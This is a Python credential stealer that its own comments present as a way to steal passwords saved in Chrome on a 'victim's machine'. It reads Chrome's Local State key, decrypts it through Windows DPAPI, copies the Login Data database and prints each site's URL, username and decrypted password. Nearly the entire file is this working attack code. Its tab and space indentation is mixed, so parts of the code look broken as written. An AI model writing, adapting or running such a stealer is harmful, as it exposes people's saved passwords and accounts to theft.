# The purpose of this script is to steal credentials stored in Chrome browser.
# We will 'exploit' the fact that on Windows machines (probably on Linux and IOS as well)
# chrome browser 'data' is stored in the directory: C:\Users\___User__Name___\AppData\Local\Google\Chrome\User Data\ in file 'Local State'

# Requirement on victim's machine: python2.7 and pip installed

# Required libraries:
import os 
import json
import base64
import sqlite3
import win32crypt
import shutil
from datetime import datetime, timedelta
from Crypto.Cipher import AES

# Decrypt a password using the symmetric key (AES decrypt)
def aes_decrypt_data(password, encryption_key):
	try:
			# Characters 3:15 represent the initialization vector
        	iv = password[3:15]
        	password = password[15:]
			# Once we have the symmetric key, we can decrypt the password (decrypt AES encrytion)
        	cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
        	return cipher.decrypt(password)[:-16].decode()
	except:
        	try:
			return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
		except:
            		print("No Passwords found in chrome")


# Function to extract the key used for AES encryption
def get_encryption_key():
	# Local directory where chrome metadata is stored
	path_to_chrome_data = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
	with open(path_to_chrome_data, 'r') as file:
		chrome_data = file.read()
		# Extract as JSON to get the "encrypted_key" field
		chrome_data = json.loads(chrome_data)
	# First we have to decode the key using base64
	encryption_key = base64.b64decode(chrome_data["os_crypt"]["encrypted_key"])
	# For security purposes windows add the first 5 characters of the key for Windows Data Protection API
	encryption_key = encryption_key[5:]
	# This function decrypts data that was encrypted using win32crypt::CryptProtectData.
	return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

def main():
	encrypted_key = get_encryption_key()
	db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
	# It is important to state that 'Login Data' file in SQlite format. We cannot read it directly
	# hence we must store it and use sqlite module to parse each line
	filename = "passwords.db"
    	shutil.copyfile(db_path, filename)
	db = sqlite3.connect(filename)
	cursor = db.cursor()
	cursor.execute("select origin_url, action_url, username_value, password_value from logins")
	print("-----------------")
	print("The encrypted key fetched from the chrome Local State is: ")
	print(encrypted_key)
	print("-----------------")
	for row in cursor.fetchall():
        	main_url = row[0]
        	login_page_url = row[1]
        	user_name = row[2]
        	decrypted_password = aes_decrypt_data(row[3], encrypted_key)
          
        	if user_name or decrypted_password:		
            		print("Main URL: {}".format(main_url))
            		print("Login URL: {}".format(login_page_url))
            		print("User name: {}".format(user_name))
            		print("Decrypted Password: {}".format(decrypted_password))
        	else:
            		continue
          
		print("-----------------")
	cursor.close()
	db.close()
    # Once we have iterated over the DB file, we no longer need it
	try:
        	os.remove(filename)
	except:
        	pass
  
  
if __name__ == "__main__":
    main()